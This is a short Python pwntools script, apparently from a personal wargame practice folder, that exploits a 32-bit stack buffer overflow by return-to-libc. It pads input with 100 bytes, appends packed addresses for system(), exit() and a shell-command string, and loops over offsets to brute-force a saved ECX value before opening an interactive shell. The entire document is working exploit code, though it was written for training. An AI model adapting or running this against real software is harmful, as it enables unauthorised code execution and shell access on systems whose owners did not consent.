from pwn import *
ecx = 0xffffd058
system_addr = 0xf7e143f0
exit_addr = 0xf7e07510
shell_cmd = 0xf7f51f68

for shift in range(0x01, 0xff):
    ecx_shift = ecx+shift
    cmd = '1'*100 + p32(ecx_shift)+p32(system_addr)+p32(exit_addr)+p32(shell_cmd)
    print hex(shift)
    print hex(ecx_shift)
    fd = process("/home/owen/wargame_write-up/practice/buffer_overflow/32bit/return_to_libc "+cmd, shell=True)
    #if fd.recvline() != "":
    #	fd.interactive()
    fd.recvline()
    fd.interactive()
